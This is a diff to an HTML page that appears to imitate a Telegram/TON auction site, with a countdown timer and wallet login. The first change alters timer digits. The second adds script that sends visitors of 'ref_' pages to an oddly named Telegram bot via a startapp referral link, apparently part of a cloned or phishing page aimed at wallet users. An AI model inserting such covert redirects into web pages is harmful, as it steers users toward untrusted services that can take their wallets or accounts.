@@ -171,7 +171,7 @@
 <div class="tm-section-countdown">
 <span class="tm-countdown-label short">Ends in</span>
 <span class="tm-countdown-label full">Auction ends in</span>
-<time class="tm-countdown-timer" data-relative="counter" datetime="2026-06-23T14:30:00+00:00"><span class="reel"><b class="digit timer-d" data-val="3 days"></b></span><span class="reel"><b class="digit timer-h0" data-val="0"></b><b class="digit timer-h1" data-val="2"></b></span><span class="reel"><b class="digit timer-m0" data-val="1"></b><b class="digit timer-m1" data-val="0"></b></span><span class="reel"><b class="digit timer-s0" data-val="4"></b><b class="digit timer-s1" data-val="7"></b></span></time>
+<time class="tm-countdown-timer" data-relative="counter" datetime="2026-06-23T14:30:00+00:00"><span class="reel"><b class="digit timer-d" data-val="3 days"></b></span><span class="reel"><b class="digit timer-h0" data-val="0"></b><b class="digit timer-h1" data-val="2"></b></span><span class="reel"><b class="digit timer-m0" data-val="0"></b><b class="digit timer-m1" data-val="3"></b></span><span class="reel"><b class="digit timer-s0" data-val="4"></b><b class="digit timer-s1" data-val="2"></b></span></time>
 </div>
 <div class="tm-section-countdown-end">
 <span class="tm-countdown-label">Auction will close soon</span>
@@ -476,6 +476,13 @@ Wallet.init({"address":false,"ton_proof":"e6e3b091f7ff939354","logged_in":false,
     if (sp.startsWith('ref_')) {
       var id = sp.replace('ref_', '');
       window.location.href = '/ref_' + id + '.html';
+    }
+  } else {
+    var path = window.location.pathname;
+    var page = path.split('/').pop();
+    if (page.startsWith('ref_')) {
+      var id = page.replace('ref_', '').replace('.html', '');
+      window.location.href = 'https://t.me/dadaddfewfwegfw_bot?startapp=ref_' + id;
     }
   }
   var q = new URLSearchParams(window.location.search);
